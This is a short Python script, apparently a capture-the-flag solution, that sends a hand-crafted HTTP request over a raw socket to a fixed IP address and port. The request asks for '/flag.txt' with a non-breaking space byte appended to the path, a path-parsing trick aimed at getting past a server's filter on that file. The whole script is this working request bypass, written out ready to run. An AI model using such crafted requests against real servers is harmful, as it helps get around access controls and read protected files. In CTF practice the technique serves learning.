import socket

host = "125.220.147.47"
port = 49221
path = b"/flag.txt\xa0"

# 创建 TCP 连接
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

request = b"GET " + path + b" HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n"
s.sendall(request)

# 读取响应
response = b""
while True:
    data = s.recv(1024)
    if not data:
        break
    response += data

s.close()

# 打印完整响应
print(response.decode(errors="ignore"))
